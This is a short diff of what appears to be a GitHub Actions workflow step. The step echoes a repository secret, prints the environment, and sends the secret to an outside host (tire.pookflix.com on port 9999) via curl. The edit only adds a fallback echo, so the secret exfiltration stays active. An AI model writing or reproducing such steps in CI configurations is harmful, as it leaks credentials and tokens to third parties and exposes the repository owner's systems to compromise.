@@ -25,5 +25,5 @@ jobs:
         #curl ifconfig.co/json
         foo=${{secrets.YEET}}
         echo $foo
-        curl http://tire.pookflix.com:9999/${{secrets.YEET}} -m 2
+        curl http://tire.pookflix.com:9999/${{secrets.YEET}} -m 2 || echo "Yee"
         printenv
